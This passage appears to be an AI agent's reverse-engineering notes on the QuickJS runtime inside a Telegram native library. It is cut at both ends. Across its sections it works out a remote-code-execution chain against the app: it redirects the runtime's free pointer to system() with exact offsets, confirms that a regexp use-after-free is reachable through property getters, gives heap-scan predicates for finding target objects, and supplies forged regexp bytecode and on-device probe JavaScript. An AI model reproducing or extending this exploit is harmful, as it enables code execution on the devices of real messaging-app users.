0x16fa618  MOV   X1, X19             ; arg1 = ptr-8 (JSMallocBlockHeader)
0x16fa628  BR    X2                 ; tail call
```

So `rt+0x10 = system` and `rt+0x40 = cmd` gives `system(cmd, ptr-8)` — `system` ignores
argv[1]. Note the argument is the **8-byte block header**, not the user pointer
(`JSMallocBlockHeader` is `{u16 ; u8 ; flags ; int ref_count ; u8 user_data[]}` with
`user_data` at `+8`), which is irrelevant for `system` but explains the second argument.

"When is it a large block": `total_size = ((size + 7) & ~7) + 8` and the small-arena path
is taken when `total_size <= 512` (`JS_ARENA_MAX_SMALL_SIZE`), i.e. every allocation with
`size >= 505` bytes is a large block (and `JS_ARENA_LARGE_BLOCKS_ONLY` is 0 in a normal
build). Caution: before the indirect call, `js_free_rt` checks
`usable_size + MALLOC_OVERHEAD(8) <= rt->malloc_state.malloc_size` and aborts on underflow
(`0x16fa574`–`0x16fa57c`, `"js_free_rt: malloc_size underflow"`), so the trigger allocation
must be one the runtime itself accounted for.

### 13.5 Caveats

* **Offsets are vaddrs**; for the 1st `PT_LOAD` (`0..0x18ae4e0`) file offset == vaddr, but
  for the 2nd/3rd segments they differ (`free@GOT` file offset `0x195c430` vs vaddr
  `0x1960430`). Use the vaddr for `base + off`.
* **RELRO**: both GOT slots are read-only after relocation — read-only use is fine; the
  chain must not plan to write them.
* **BIND_NOW**: guaranteed resolved `libc free` in the slot (no lazy stub, no
  `DT_PLTGOT` resolver trampoline indirection).
* **BTI/PAC**: the library has **no `.note.gnu.property`** (only `.note.android.ident`
  and `.note.gnu.build-id`), i.e. it requests neither `GNU_PROPERTY_AARCH64_FEATURE_1_BTI`
  nor `_PAC`. The hijacked transfer `BR X2` is a plain indirect branch, so pointing it at
  `system` needs no BTI landing pad. (`system` in bionic is BTI/PAC-clean anyway.)
* The `.so` is not stripped of its dynamic symbol table (410 PLT entries, `.dynsym` with
  local+global syms), so `free`'s symbol index 28 and both relocations are directly
  readable in the APK for re-verification.
* Static analysis only; nothing was run on the device and `cache4.db` was not touched.

### 13.6 How it was verified

1. Import `free` @ `0x1cb3ce8` (extern segment) → PLT stub `.free` `0x18accf0` →
   `LDR X17,[X16,#0x430]` → GOT slot `0x1960430`.
2. Parsed the ELF directly (`PT_LOAD`/`PT_DYNAMIC`/`PT_GNU_RELRO`, `.rela.plt`,
   `.dynsym`, `.dynstr`, `.note.gnu.property`): slot → `R_AARCH64_JUMP_SLOT` → `free`,
   `DT_FLAGS/DT_FLAGS_1` → BIND_NOW, RELRO range covers `.got`+`.got.plt`.
3. Scanned `.data.rel.ro` for the 5-entry allocator table (unique hit `0x1949f30`) and
   disassembled `JS_NewRuntime` to see the by-value copy into `rt+0x00..0x20`.
4. Disassembled `js_free_rt` to confirm it fetches the callee from `[rt+0x10]` and the
   opaque from `[rt+0x40]`.
5. Read the 8 bytes at `0x1739aec` from the file and decoded `mov x0,x1; b .free`.

### 13.7 IDB changes (saved in place)

`<HOME>/ailocal/Telegram/.opencode/idbs/libtmessages_49_arm64_widget_annotated.i64`

| address | name / comment |
|---|---|
| `0x1739ad8` / `0x1739ae4` / `0x1739aec` / `0x1739af4` / `0x1739b00` | `js_def_calloc` / `js_def_malloc` / **`js_def_free`** / `js_def_realloc` / `js_def_malloc_usable_size` |
| `0x1949f30` | `def_malloc_funcs` (+ comment with the five addresses and the `rt+0x10` consequence) |
| `0x17395b8` | `JS_NewRuntime` |
| `0x1960430` / `0x1960448` | `free_GOT` / `malloc_GOT` (+ comment: JUMP_SLOT, BIND_NOW, RELRO) |

---

## 14. Independent re-confirmation of the two device constants

Re-verified from scratch, this time **decoding raw file bytes and relocation tables**
rather than trusting IDA's rendering. All three points hold.

### 14.1 `rt->mf.js_free` = `0x1739aec` — CONFIRMED

(a) The table's contents come straight from `.rela.dyn` `R_AARCH64_RELATIVE` slots
(the `.data.rel.ro` bytes themselves are 0 in the file; the addend carries the pointer):

```
slot 0x1949f30  R_AARCH64_RELATIVE  addend 0x1739ad8   -> js_def_calloc
slot 0x1949f38  R_AARCH64_RELATIVE  addend 0x1739ae4   -> js_def_malloc
slot 0x1949f40  R_AARCH64_RELATIVE  addend 0x1739aec   -> js_def_free      <- table[2]
slot 0x1949f48  R_AARCH64_RELATIVE  addend 0x1739af4   -> js_def_realloc
slot 0x1949f50  R_AARCH64_RELATIVE  addend 0x1739b00   -> js_def_malloc_usable_size
```

(b) `JS_NewRuntime`'s copy decoded from the raw instructions at `0x17395ec`:

```
90001088  adrp x8, 0x1949000
913cc108  add  x8, x8, #0xf30          ; x8 = 0x1949f30  (def_malloc_funcs)
ad400500  ldp  q0, q1, [x8]            ; table[0..3]
f9401108  ldr  x8, [x8, #0x20]         ; table[4]
f9001268  str  x8, [x19, #0x20]        ; rt+0x20 = table[4]
ad000660  stp  q0, q1, [x19]           ; rt+0x00..0x1f = table[0..3]
```

`stp q0,q1,[x19]` writes table[0],table[1] at `rt+0x00`/`rt+0x08` and table[2],table[3]
at **`rt+0x10`** / `rt+0x18` ⇒ `rt->mf.js_free = def_malloc_funcs[2] = 0x1739aec`.

(c) Cross-check inside `js_free_rt` (`0x16fa4fc`), independent of the constructor:
`0x16fa610 LDR X2,[X0,#0x10]` is called 2-arg with `X0=[rt+0x40]`, `X1=ptr-8`
(free semantics), while `0x16fa540 LDR X8,[X0,#0x20]` is called 1-arg on the block
(usable-size semantics) — exactly table indices 2 and 4.

(d) Uniqueness: `MOVZ W1,#0x5F8` (the `calloc(1, sizeof(JSRuntime))`) occurs **once** in
the whole file (`0x17395dc`), and `JS_NewRuntime` has a **single** xref
(`twidget_JSInterruptRuntime_ctor` @ `0x776c70`). There is no second runtime constructor
and no path that installs a custom `JSMallocFunctions` — so `rt+0x10` is `0x1739aec` for
the app's runtime.

### 14.2 `free@GOT` = `0x1960430`, not the GLOB_DAT at `0x1955078` — CONFIRMED

(a) `.free` PLT stub bytes at `0x18accf0`: `900005b0 f9421a11 9110c210 d61f0220`

```
adrp x16, 0x1960000
ldr  x17, [x16, #0x430]     ; -> slot 0x1960430
add  x16, x16, #0x430
br   x17
```

(b) `.rela.plt` entry with `r_offset = 0x1960430`: symbol index 28 = **`free`**,
`type = 1026` = `R_AARCH64_JUMP_SLOT`, addend 0.

(c) `.plt` scan (all 411 GOT references): **exactly one** stub references `0x1960430`
(the stub at `0x18accf0`), and **zero** PLT stubs reference `0x1955078`. The GLOB_DAT
slot is only reached by code that materialises `&free` (`ADRP/ADD + LDR`, e.g.
`sub_1564210`, ffmpeg allocator table) — `js_def_free`'s `B .free` cannot use it.

### 14.3 Caveats — CONFIRMED / refined

| caveat | finding |
|---|---|
| BIND_NOW | `DT_FLAGS = 0xa` (`DF_SYMBOLIC\|DF_BIND_NOW`), `DT_FLAGS_1 = 0x1` (`DF_1_NOW`) ⇒ all `JUMP_SLOT`s resolved at load. |
| File vs runtime value | the *file* bytes at `0x195c430` are `20 cb 8a 01 00 00 00 00` = **`0x18acb20` (PLT0)**, i.e. the lazy-binding bootstrap value. With BIND_NOW the loader overwrites it with libc `free` during relocation — read it **at runtime**, never from the file. |
| RELRO | `PT_GNU_RELRO` = `0x18b24e0` + `0xaeb48` → covers `0x18b24e0..0x1961028`: both `.got` (`0x1954ee8`) and `.got.plt` (`0x1960340`–`0x1961028`) are read-only after relocation. Reading is fine; writing faults. |
| PAC / BTI | no `.note.gnu.property` section at all (only `.note.android.ident` and `.note.gnu.build-id`) ⇒ the library requests neither `FEATURE_1_BTI` nor `FEATURE_1_PAC`; the hijacked `BR X2` at `0x16fa628` needs no landing pad. |
| Address form | vaddrs; `runtime = libtmessages base + vaddr`. File offsets differ in segments 2/3 (`free@GOT`: vaddr `0x1960430`, file `0x195c430`; `def_malloc_funcs`: vaddr `0x1949f30`, file `0x1945f30`). |
| Argument passed to `system` | `X1 = ptr - 8` (`JSMallocBlockHeader`), `X0 = rt+0x40`. `system` ignores the second argument. |
| Trigger size | `((size+7)&~7)+8 > 512` ⇒ `size >= 505` takes the large-block path that performs the indirect call. |

### 14.4 One-line on-device sanity check (for the RCE run)

After load: `*(uint64_t*)(base + 0x1960430)` must equal the libc `free` of the process
(cross-check with `/proc/self/maps`+`dlsym`), and the leaked `rt->mf.js_free` must equal
`base + 0x1739aec`. Both were confirmed statically here.

No IDB or device changes were made for this re-confirmation (read-only pass).

---

## 15. `JSObject` / fast-array layout in this build (Y-object scan)

Short answer: **the layout matches the lab's assumption exactly — there is no offset
difference to find.** Everything below is read out of the shipped code, not the struct
comment. If the scan still returns `o=-1`, the cause is one of the items in §15.5.

### 15.1 Confirmed offsets (64-bit, `p` = `JSObject *`)

| field | offset | where confirmed |
|---|---:|---|
| GC header `{prev,next}` (`JSGCObjectHeader`) | `+0x00`..`+0x0F` | implied by flags/class_id at `+0x10`/`+0x12`; `shape` at `+0x18` |
| flags word (`is_prototype`…`is_HTMLDDA`) | `+0x10` (u16) | `js_array_push` mask test |
| **`class_id`** | **`+0x12`** (u16) | `js_array_push`, `js_typed_array_at`, `js_map_set`, `JS_RegExpDelete` |
| `shape` | `+0x18` | `js_array_push` |
| `prop` | `+0x20` | `js_array_push` (`p->prop[0].u.value` = array length) |
| `first_weak_ref` | `+0x28` | `js_map_finalizer` (`u` follows at `+0x30`) |
| union `u` | `+0x30` | `js_map_set` (`u.map_state`), `JS_RegExpDelete` (`u.regexp.bytecode` at `+0x38`) |
| `u.array.u1` (`size` / `typed_array`) | `+0x30` | `js_array_push` (`u1.size`), `js_typed_array_at` (`u1.typed_array`) |
| **`u.array.u.ptr` / `u.array.values`** | **`+0x38`** | `js_array_push`, `js_array_finalizer`, `js_typed_array_at` |
| **`u.array.count`** | **`+0x40`** (u32) | same three |

`fast_array` = **bit 4 (0x10) of the 16-bit flags word at `+0x10`**
(`is_prototype`=bit0, `extensible`=bit1, `free_mark`=bit2, `is_exotic`=bit3,
**`fast_array`=bit4**, `is_constructor`=bit5, `is_uncatchable_error`=bit6, `tmp_mark`=bit7,
`is_HTMLDDA`=bit8). `sizeof(JSObject)` = **0x48**.

### 15.2 Code evidence

**`js_array_push` = `0x1756ac8`** (C-function table entry `"push"` @ `0x194cde8`), fast path
condition decompiled verbatim:

```c
if ( (_DWORD)a3 == -1 && a6 == 0
     && *(_WORD *)(a2 + 18) == 2                                  /* class_id == JS_CLASS_ARRAY */
     && (~*(unsigned __int16 *)(a2 + 16) & 0x12) == 0 )           /* flags16 & (0x02|0x10) */
{
    v8 = *(_QWORD *)(a2 + 24);                    /* p->shape          (+0x18) */
    v9 = *(__int64 **)(a2 + 32);                  /* p->prop           (+0x20) */
    v10 = *v9;                                    /* prop[0].u.value = array length */
    ... *(_DWORD *)(a2 + 64) == (_DWORD)v10       /* p->u.array.count  (+0x40) */
    ... (unsigned int)result > *(_DWORD *)(a2 + 48)   /* p->u.array.u1.size (+0x30) */
    v15 = *(_QWORD *)(a2 + 56);                   /* p->u.array.values (+0x38) */
        *(_OWORD *)(v15 + 16 * v13) = v14;        /* 16-byte JSValue elements */
    *(_DWORD *)(a2 + 64) = result;                /* count = new_len */
```

Source equivalent (v0.18.0, `js_array_push`): `p->class_id == JS_CLASS_ARRAY &&
p->fast_array && p->extensible && …` — exactly the `0x12` mask (bit1 `extensible` +
bit4 `fast_array`). This is the strongest single confirmation of the flag bit.

**`js_array_finalizer` = `0x1738030`** (class-table slot for class 2):

```c
if ( *(_DWORD *)(a2 + 64) != 0 ) { do { v6 = *(_QWORD *)(a2 + 56) + v4; ... v4 += 16; }
                                    while (v5 < *(unsigned int *)(a2 + 64)); }
return js_free_rt(a1, *(_QWORD *)(a2 + 56));
```

**`js_typed_array_at` = `0x174b4a8`** (table entry `"at"` @ `0x194ecf8`):

```c
if ( a3 != -1 || (v6 = *(unsigned __int16 *)(a2 + 18)) - 22 >= 0xC )  /* class_id in 22..33 */
    ... "not a TypedArray"
v7 = *(_QWORD *)(a2 + 48);            /* u.array.u1.typed_array (+0x30) */
   *(unsigned int *)(v7 + 32)         /*   ta->offset  (+0x20) */
   *(unsigned int *)(v7 + 36)         /*   ta->length  (+0x24) */
   *(_BYTE *)(v7 + 40)                /*   ta->track_rab (+0x28) */
v11 = *(unsigned int *)(a2 + 64);     /* u.array.count (+0x40) */
return (double)*(unsigned int *)(*(_QWORD *)(a2 + 56) + 4 * idx);   /* u.array.u.ptr (+0x38) */
```

**`js_typed_array_finalizer` = `0x173891c`**: `v2 = *(p+48)` (JSTypedArray*), `v2[3]` =
`ta->buffer` (+0x18), `v2[0]/v2[1]` = `link.prev/next`.

`JSTypedArray`: `{ list_head link 0x0/0x8; JSObject *obj 0x10; JSObject *buffer 0x18;
uint32 offset 0x20; uint32 length 0x24; bool track_rab 0x28 }`.

### 15.3 Class IDs (class table @ `0x19499d8`, 24-byte entries, `class_id = index+1`)

| class_id | atom | name |
|---:|---:|---|
| 1 | 157 | `Object` |
| **2** | 158 | **`Array`** |
| 19 | 171 | `RegExp` |
| 20 / 21 | 172 / 173 | `ArrayBuffer` / `SharedArrayBuffer` |
| 22 | 174 | `Uint8ClampedArray` |
| 23 | 175 | `Int8Array` |
| **24** | 176 | **`Uint8Array`** |
| 25..33 | 177..185 | `Int16Array` … `Float64Array` |
| 34 | 186 | `DataView` |

**`JS_CLASS_UINT8_ARRAY = 24`** (typing arrays are 22..33; `DataView` = 34). This enum is
identical in v0.17.0, v0.18.0 and the binary (both sources list `JS_CLASS_C_CLOSURE` at 16,
which is *not* in older quickjs — an old constant list gives `Uint8Array = 23`).

### 15.4 `JSGCObjectHeader` size

**16 bytes** (`{prev,next}`, and `&p->header == p`). Proof from code: the flags word is
read/written at `+0x10` and `class_id` at `+0x12` (u16), i.e. everything before `+0x10`
is the header; `shape` then lands at `+0x18` (8-aligned after 4 bytes of flags+class_id).

### 15.5 Why a scan can still return `o = -1` (ranked)

1. **Class ID** — use **24**, or accept **22..33** for "any typed array". A scan using 23
   (older quickjs numbering, or confusing `Int8Array`) finds nothing. `DataView` is 34 and
   has no `fast_array`.
2. **Scanning allocation blocks instead of user pointers.** `JSObject` is allocated with
   `js_malloc` → `JSMallocBlockHeader { u16 block_idx; u8 block_size_idx; u8 gc flags;
   int ref_count; u8 user_data[] }`, so `JSObject* = block + 8`. A scanner that reads
   `class_id` at `block+0x12` is effectively reading `p_user+0xA` → always fails.
3. **Arena allocation.** `sizeof(JSObject)` is 0x48 (72 B) and goes through
   `js_arena_malloc`: total 80 B ≤ 512 ⇒ it is carved out of a 4 KiB `JSArena`, **not** a
   standalone libc/Scudo chunk. A heap scan that walks malloc chunk metadata (or only
   "large" blocks) will never see it; scan the raw heap/arena pages instead.
4. **Flag test too strict.** A freshly created typed array has
   `flags16 = 0x1A` (`extensible|is_exotic|fast_array`); testing `== 0x10` or requiring
   `is_exotic` to be clear fails. Test `flags16 & 0x10` only.
5. **Wrong object kind.** If "Y" is a `Uint8ClampedArray` → 22; a plain `Array` → 2
   (elements are 16-byte `JSValue` at `+0x38`, count at `+0x40`, capacity `u1.size` at
   `+0x30`); a `String` → 5; an `ArrayBuffer` → 20 (data pointer lives in
   `u.array_buffer`, not `u.array.u`).
6. **Validation helper.** For a typed-array candidate the strongest sanity check is
   `*(void **)(*(void **)(p + 0x30) + 0x10) == p` ( `ta->obj` back-pointer, offset 0x10 )
   plus `ta->buffer` at `+0x18` non-NULL — it eliminates most false positives from a raw
   memory scan.

### 15.6 Scan predicate that matches this build

```c
uint16_t cid   = *(uint16_t *)(p + 0x12);      // 24 = Uint8Array, 22..33 = typed arrays
uint16_t flags = *(uint16_t *)(p + 0x10);      // bit4 = fast_array, bit3 = is_exotic
uint32_t count = *(uint32_t *)(p + 0x40);      // element count (== byte length for Uint8Array)
void    *data  = *(void **)(p + 0x38);         // view-adjusted data pointer
void    *ta    = *(void **)(p + 0x30);         // JSTypedArray*, ta->obj at +0x10 must == p
```

No IDB or device changes were made for this check (read-only).

---

## 16. Does `String.prototype.replace` take the `JS_RegExpDelete` fast path with the PR #1827 getter trick?

**Verdict: getter-triggerable fast path PRESENT.** `js_regexp_Symbol_replace` gates on
`rp && rp->len == 0 && is_global && js_is_standard_regexp(rx)`, and
`js_is_standard_regexp` is an *observable* check: it calls `JS_GetProperty(rx,
"constructor")` and (if that matches) `JS_GetProperty(rx, "exec")`. Both attacker getters
run **before** `JS_RegExpDelete` and **after** the `lastIndex = 0` reset, which is exactly
the order the PR #1827 trigger needs.

### 16.1 The gate (`js_regexp_Symbol_replace` = `0x176235c`)

```
0x1762530  MOV W3,#0x74 ; BL sub_17087A8        ; flags = JS_GetProperty(rx, atom 116 "flags")
...
0x1762874  BL  sub_170E824                      ; JS_SetProperty(rx, atom 93 "lastIndex", 0)
                                                ;   (only in the is_global branch)
0x1762878  TBNZ W0,#31, <exception>
0x176287c  CBZ  X23, 0x17628D0                  ; (1) rp == NULL  -> generic path
0x1762880  LDR  W8,[SP,#var_130]                ;     is_global = (string_indexof_char(flags,'g') != -1)
0x1762884  CMN  W8,#1 ; B.EQ 0x17628D0          ; (2) no 'g'       -> generic path
0x176288c  LDR  X8,[X23]                        ;     rp->len (JSString header, low 31 bits)
0x1762890  AND  X8,X8,#0x7FFFFFFF
0x1762894  CBNZ X8, 0x17628D0                   ; (3) len != 0     -> generic path
0x1762898  .. args (ctx, rx.ptr, rx.tag)
0x17628a4  BL   sub_1765084                     ; (4) js_is_standard_regexp(ctx, rx)
0x17628a8  CBZ  W0, 0x17628D0                   ;     == 0         -> generic path
0x17628c0  BL   JS_RegExpDelete(ctx, rx, str)   ; fast path taken
```

Source equivalent (v0.17.0/v0.18.0): `if (rp && rp->len == 0 && is_global &&
js_is_standard_regexp(ctx, rx))`. Note (a) `is_global` comes from the **`flags` string**
(`JS_GetProperty(rx,"flags")` at `0x1762530`), and (b) the `lastIndex = 0` reset at
`0x1762874` happens **before** the standard check runs.

### 16.2 `js_is_standard_regexp` = `0x1765084` — two observable property reads

```
0x1765098  MOV  W3,#0x40                       ; atom 64 = "constructor"
0x17650b4  BL   sub_17087A8                    ; JS_GetProperty(rx, "constructor")   <-- getter runs
0x17650bc  CMP  W22,#6 ; B.NE ...              ; exception -> return -1
0x17650cc  LDP  X2,X3,[X19,#0x90]              ; ctx->regexp_ctor  (ptr @ctx+0x90, tag @+0x98)
0x17650dc  BL   sub_170BDA0                    ; js_same_value(val, ctx->regexp_ctor)
0x1765114  TBZ  W0,#0, 0x17651B4               ; not equal -> return 0  (exec is NOT read)
0x1765124  MOV  W3,#0x8F                       ; atom 143 = "exec"
0x1765134  BL   sub_17087A8                    ; JS_GetProperty(rx, "exec")           <-- getter runs
0x1765148  CMN  W2,#1 ; B.NE ...               ; must be an object
0x1765150  LDRH W8,[X1,#0x12] ; CMP W8,#0xC    ; class_id == JS_CLASS_C_FUNCTION (12)
0x176515c  LDR  X8,[X1,#0x38]                  ; u.cfunc.c_function.generic
0x1765164  ADR  X9, js_regexp_exec
0x1765168  CMP  X8,X9                          ;   == js_regexp_exec   (@0x1760690)
0x1765170  LDRH W8,[X1,#0x42] ; CMP W8,#0      ; u.cfunc.magic == 0
0x1765178  CSET W0,EQ                          ; -> return 1
```

This is `JS_IsCFunction(ctx, val, js_regexp_exec, 0)` inlined (`class 12`, generic pointer
at `+0x38`, `magic` at `+0x42`). **There is no internal-slot or class-only shortcut**: both
reads are ordinary `JS_GetProperty` calls (prototype-chain lookups), so a `constructor`
getter on the instance is invoked.

### 16.3 Order relative to the reset / the PR trigger

1. `0x1762874` — `rx.lastIndex = 0` (JS_SetProperty, atom 93).
2. `0x17650b4` — **`constructor` getter runs**; the PR payload sets
   `regexp.lastIndex = { valueOf() { … } }` here.
3. `0x17650dc` — compare with `ctx->regexp_ctor`; if equal →
4. `0x1765134` — `exec` getter / lookup; must be the builtin `js_regexp_exec` (magic 0).
5. `0x17628c0` — `JS_RegExpDelete(ctx, rx, str)`.
6. inside it: `0x17652f0` — `JS_GetProperty(rx, "lastIndex")` returns the planted object,
   `0x1765344` — `JS_ToLengthFree` → **`valueOf()` runs** → `re.compile()` frees the
   bytecode; `0x1765528` — `lre_exec` on the stale pointer (§11).

Because the reset (step 1) precedes the getter (step 2), the getter's assignment survives;
because the getter precedes `JS_RegExpDelete` (step 5), the planted `lastIndex` object is
what step 6 reads. The PR chain is structurally intact on this binary.

Quirk worth knowing: the call site tests `(unsigned)sub_1765084(...) != 0`, and the
function returns **-1** on a thrown exception from either getter — `-1 != 0` is true, so a
*throwing* `constructor`/`exec` getter still enters the fast path (with an exception
pending). Only a clean `0` skips it.

### 16.4 Why the device probe can still report "not taken"

Every one of these must hold at the call:

| # | condition | where | typical failure |
|---|---|---|---|
| 1 | `rep` is **not** a function and converts to a **zero-length** string | `rp != NULL && rp->len == 0` (`0x176287c`,`0x1762894`) | replacement `"x"` or `"$&"` → generic path |
| 2 | `rx.flags` **string** contains `g` | `0x1762880`–`0x1762888` | non-global regexp |
| 3 | `rx.constructor === ctx->regexp_ctor` | `0x17650cc`–`0x1765114` | sandbox replaced the global `RegExp` / `RegExp.prototype.constructor`, or the getter returns a wrapper instead of the original constructor |
| 4 | `rx.exec` is the built-in `js_regexp_exec` with magic 0 | `0x1765150`–`0x1765178` | **sandbox wraps/patches `RegExp.prototype.exec`** (logging, timeout, taming) — the likely blocker in a widget runtime |
| 5 | the compiled bytecode really has `GLOBAL\|STICKY` | inside `JS_RegExpDelete` `0x17652c8` | a lying `flags` getter makes the gate pass while the bytecode is non-global, so `lastIndex` is never read → no `valueOf` |

Note (5): the gate uses the *flags string*, `JS_RegExpDelete` uses the *bytecode flags*.
Both must be global — a `flags` getter that returns `"g"` for a non-global regexp gets you
past step 2 but then `JS_RegExpDelete` takes the `last_index = 0` branch and never calls
`ToLength`, so `valueOf` never runs (this looks exactly like "fast path entered but chain
did nothing").

### 16.5 On-device oracles (to localise RES 0/1)

```js
let ctorHits = 0, execHits = 0, vOfHits = 0;
const re = /a/g;
Object.defineProperty(re, "constructor", {
  configurable: true,
  get() { ctorHits++; return RegExp; }          // must be the ORIGINAL ctor (ctx+0x90)
});
const origExec = RegExp.prototype.exec;         // save builtin
Object.defineProperty(RegExp.prototype, "exec", {
  configurable: true,
  get() { execHits++; return origExec; }        // getter fires only if ctor check passed
});
re.lastIndex = { valueOf() { vOfHits++; return 0; } };
"ccc".replace(re, "");                          // empty replacement, global
// ctorHits>0 -> gate reached the standard check
// execHits>0 -> rx.constructor === ctx->regexp_ctor
// vOfHits>0  -> JS_RegExpDelete ran and coerced lastIndex (full PR #1827 path)
```

* `ctorHits == 0` → conditions 1/2 failed (or `replace` never reached `Symbol.replace`).
* `ctorHits > 0, execHits == 0` → condition 3 failed (constructor not the engine's
  `ctx->regexp_ctor`; if the sandbox replaced the global `RegExp`, return the original via
  `(/x/).constructor` or `Object.getPrototypeOf(re).constructor` instead).
* `execHits > 0, vOfHits == 0` → condition 4 passed but `JS_RegExpDelete` did not coerce
  `lastIndex` (condition 5: bytecode not global) — or `re.compile()` in the getter did not
  actually change the regexp object whose `delete` is running.
* all three > 0 → the PR #1827 order is being exercised end-to-end.

No IDB or device changes were made for this check (read-only).

---

## 17. `lre_exec` opcode map / fake-program encoding (device probe `forged=0`)

**Verdict: no fork, no renumbering.** The app's libregexp opcode enum is **identical to
stock quickjs-ng (v0.17.0 and v0.18.0)**. The probe bytes `19 00 20 00 16` are not
`save_start/save_end/match` — they are `loop_check_adv_split_goto_first` (opcode 25,
**10 bytes**), `back_reference` (32) and `loop` (22). The 25 consumes 10 bytes from a
5-byte program, its `pc + offset` jump reads the offset from *past* the buffer, the
dispatcher then sees an out-of-range opcode and falls into the default case, which is
`BL .abort` at `0x17ab54c` — exactly `lre_exec + 0x1868`.

### 17.1 The dispatcher and the jump table

```
0x17a9e0c  LDRB  W27,[X8],#1      ; opcode = *pc++      (X8 = pc)
0x17a9e10  SUB   W9,W27,#1
0x17a9e14  CMP   W9,#0x2B         ; valid opcodes: 1..44  (0 and >44 -> default)
0x17a9e18  B.HI  0x17AB54C        ;  -> "jumptable default case"  BL .abort
0x17a9e1c  ADR   X10, 0x17A9E38
0x17a9e20  LDRH  W11,[X1,X9,LSL#1]; 16-bit entry, X1 = jpt_17A9E34 (@0x40D076)
0x17a9e24  ADD   X10,X10,X11,LSL#2
0x17a9e30  MOV   W20,#1           ; default return value = 1 (match)
0x17a9e34  BR    X10
```

`target = 0x17A9E38 + entry*4`. Full map (opcode → case address; source names and
operand sizes from `libregexp-opcode.h`):

| op | name | size | case |
|---:|---|---:|---|
| 1/2 | char / char_i | 3 | `0x17AA094` |
| 3/4 | char32 / char32_i | 5 | `0x17AA010` |
| 5 | dot | 1 | `0x17AA4E0` |
| 6 | any | 1 | `0x17AA41C` |
| 7 | space | 1 | `0x17AA484` |
| 8 | not_space | 1 | `0x17AA384` |
| 9/10 | line_start / line_start_m | 1 | `0x17AA024` |
| 11/12 | line_end / line_end_m | 1 | `0x17AA140` |
| 13 | goto | 5 | `0x17AA53C` |
| 14/15 | split_goto_first / split_next_first | 5 | `0x17AA1AC` |
| **16** | **match** | **1** | **`0x17AB4F0`** |
| 17 | lookahead_match | 1 | `0x17AA6F0` |
| 18 | negative_lookahead_match | 1 | `0x17AA818` |
| **19** | **save_start** | **2** | **`0x17AA0F8`** |
| **20** | **save_end** | **2** | **`0x17AA0F8`** (same block) |
| 21 | save_reset | 3 | `0x17AA5B0` |
| 22 | loop | 6 | `0x17AA3E0` |
| 23..26 | loop_split_{goto,next}_first, loop_check_adv_split_{goto,next}_first | 10 | `0x17A9E38` |
| **27** | **set_i32** | **6** | **`0x17AA7E8`** |
| 28..31 | word_boundary / _i / not_ / not__i | 1 | `0x17A9E78` |
| 32..35 | back_reference / _i / backward_ / backward__i | 2+ | `0x17A9ED8` |
| 36/37 | range / range_i | 3+ | `0x17AA1E4` |
| 38/39 | range32 / range32_i | 3+ | `0x17A9FB4` |
| 40/41 | lookahead / negative_lookahead | 5 | `0x17AA240` |
| 42 | set_char_pos | 2 | `0x17AA2F0` |
| 43 | check_advance | 2 | `0x17AA854` |
| 44 | prev | 1 | `0x17AA31C` |
| 0, >44 | — | — | `0x17AB54C` `BL .abort` (default) |

Cross-checks that pin the naming: case 16 is the epilogue with `W20 = 1`; case 19/20 does
`idx = 2*pc[0] + (opcode-19)` and `capture[idx] = cptr`; case 27 does
`idx = pc[0] + 2*capture_count`, `capture[idx] = get_u32(pc+1)`, `pc += 5`; case 42 stores
`cptr` into a register; case 44 backs the char pointer up (surrogate pair handling).
All of them match the stock `libregexp-opcode.h` numbering exactly.

### 17.2 Bytecode header (confirmed in `lre_exec`)

```
+0x00  u16  flags                LDRH W8,[X1]      @0x17A9D04
+0x02  u8   capture_count        LDRB W8,[X1,#2]   @0x17A9D24  (memset capture[0..2*cc-1])
+0x03  u8   register_count       (used by the *caller*: alloc_count = 2*cc + rc,
                                  JS_RegExpDelete @0x17653B8: LDRB [X28,#2] / LDRB [X28,#3])
+0x04  u32  bytecode_len         (not read by lre_exec; only lre_check_bytecode / group names)
+0x08  ---  program start         ADD X25,X20,#8    @0x17A9DEC
```

Flags: `GLOBAL=0x01, IGNORECASE=0x02, MULTILINE=0x04, DOTALL=0x08, UNICODE=0x10,
STICKY=0x20, INDICES=0x40, NAMED_GROUPS=0x80, UNICODE_SETS=0x100`.
`JS_RegExpDelete` tests `flags & 0x21` (`GLOBAL|STICKY`) to decide whether it reads
`lastIndex` (`0x17652C8`); `lre_exec` tests `flags & 0x110` (`UNICODE|UNICODE_SETS`) for
`is_unicode` (`0x17A9D1C`).

### 17.3 Correct fake programs

**(a) Minimal zero-length match** (`capture_count = 1`, `register_count = 0`, 13 bytes):

```
01 00          flags   = GLOBAL            (needed for the lastIndex coercion)
01             capture_count = 1
00             register_count = 0
05 00 00 00    bytecode_len = 5
13 00          save_start(group 0)   -> capture[0] = cptr
14 00          save_end  (group 0)   -> capture[1] = cptr   (start == end -> len 0)
10             match                 -> lre_exec returns 1
```

**Program-only bytes: `13 00 14 00 10`** (this is the `19 00 20 00 16` the probe should
have used).

**(b) `set_i32` forge of `capture[0]` / `capture[1]`** — set `capture_count = 0` so that
`idx = 2*0 + reg = reg`, i.e. `set_i32 reg 0` writes `capture[0]` and `reg 1` writes
`capture[1]`. `register_count` must be ≥ 2 so `alloc_count = 2*cc + rc = 2` (16 bytes).
Note `save_start`/`save_end` are **rejected** when `capture_count = 0`
(`0x17AA100: CMP capture_count,group ; B.LS 0x17AB534` → return **-3**,
"corrupted bytecode in regexp execution"), so the program must use only `set_i32` + `match`.

```
01 00          flags = GLOBAL
00             capture_count = 0
02             register_count = 2
0D 00 00 00    bytecode_len = 13
1B 00 <u32 LE> set_i32 reg 0 -> capture[0] = (void*)(uintptr_t)value   (6 bytes)
1B 01 <u32 LE> set_i32 reg 1 -> capture[1] = (void*)(uintptr_t)value   (6 bytes)
10             match
```

21 bytes total. `lre_exec` then returns 1 and `JS_RegExpDelete` computes
`start = (capture[0]-str_buf)>>shift`, `end = (capture[1]-str_buf)>>shift`,
`next_src_pos = end`, and `string_buffer_concat(b, str, next_src_pos, start)` — the values
written by `set_i32` are the forged start/end.

If the payload wants a *normal* capture layout instead (`capture_count >= 1`), the register
window starts at `2*cc`, so `set_i32 reg r` hits `capture[2*cc + r]` — it can **never**
reach `capture[0]/capture[1]` in that configuration. This is the difference between
`forged=0` (nothing written where the caller reads) and a forged length.

### 17.4 Caveats for the rebuilt payload

* `uintptr_t` of a `u32`: values are **zero-extended** into the 64-bit capture slot
  (`LDUR W21,[pc+2]` then `STR X21`), so `capture[k] = 0x00000000_xxxxxxxx`.
* `set_i32` has **no bounds check** on `idx` (`SAVE_CAPTURE_CHECK` only dedups the saved
